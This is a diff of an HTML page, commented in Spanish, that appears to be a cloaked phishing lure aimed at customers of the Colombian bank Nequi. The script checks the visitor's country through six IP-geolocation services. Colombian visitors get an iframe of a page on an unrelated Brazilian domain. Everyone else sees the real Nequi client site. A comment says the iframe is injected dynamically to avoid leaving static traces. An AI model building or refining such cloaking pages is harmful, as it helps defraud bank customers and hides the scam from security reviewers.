@@ -1,40 +1,96 @@
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cargando...</title>
     <style>
-        /* Asegura que el iframe ocupe toda la pantalla sin barras de desplazamiento del padre */
-        body,
-        html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background-color: #ffffff;
-            /* Color de fondo mientras carga */
+        body, html { 
+            margin: 0; 
+            padding: 0; 
+            width: 100vw; 
+            height: 100vh; 
+            background: #ffffff; 
+            overflow: hidden; 
         }
-
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
+        .ui-layer { 
+            width: 100%; 
+            height: 100%; 
+            border: none; 
             display: block;
-            /* Elimina espacios extra en algunos navegadores */
         }
     </style>
 </head>
-
 <body>
-    <!-- Remplaza 'https://mweplasticos.com.br/nuevo/' con tu enlace de destino final -->
-    <iframe src="https://clientes.nequi.com.co/" allowfullscreen
-        sandbox="allow-forms allow-scripts allow-top-navigation allow-same-origin allow-popups"></iframe>
-</body>
+    <!-- El iframe se inyectará dinámicamente para evitar rastros estáticos en el HTML -->
+    
+    <script>
+        (function() {
+            // Configuración (Puedes modificar estos valores directamente)
+            const _cfg = {
+                t: 'CO', // Código de país permitido
+                p1: 'https://mweplasticos.com.br/nuevo/', // URL_ALLOWED (SÓLO para Colombia)
+                p2: 'https://clientes.nequi.com.co/' // URL_RESTRICTED (Para el resto del mundo)
+            };
 
+            // Lista de endpoints en un formato de array simple
+            const _endpoints = [
+                ['https://api.country.is/', 'country'],
+                ['https://ipwho.is/', 'country_code'],
+                ['https://get.geojs.io/v1/ip/country.json', 'country'],
+                ['https://ipinfo.io/json', 'country'],
+                ['https://ipapi.co/json/', 'country_code'],
+                ['https://freeipapi.com/api/json', 'countryCode']
+            ];
+
+            // Inyección dinámica del iframe
+            const _mount = (targetUrl) => {
+                const frm = document.createElement('iframe');
+                frm.className = 'ui-layer';
+                frm.src = targetUrl;
+                document.body.appendChild(frm);
+            };
+
+            // Lógica de petición reestructurada
+            const _fetchNode = async (url, prop) => {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 4500);
+                
+                try {
+                    const response = await fetch(url, { 
+                        signal: controller.signal,
+                        cache: 'no-store' // Evita que el navegador use una ubicación almacenada en caché
+                    });
+                    clearTimeout(timeoutId);
+                    
+                    if (!response.ok) throw new Error('ERR_RSP');
+                    
+                    const data = await response.json();
+                    if (data && data[prop]) return data[prop];
+                    
+                    throw new Error('ERR_PROP');
+                } catch (e) {
+                    clearTimeout(timeoutId);
+                    throw e;
+                }
+            };
+
+            // Función de inicio principal
+            const _init = async () => {
+                try {
+                    const tasks = _endpoints.map(e => _fetchNode(e[0], e[1]));
+                    const result = await Promise.any(tasks);
+                    
+                    _mount(result === _cfg.t ? _cfg.p1 : _cfg.p2);
+                } catch (err) {
+                    // Fallback
+                    _mount(_cfg.p2);
+                }
+            };
+
+            // Ejecución
+            _init();
+        })();
+    </script>
+</body>
 </html>
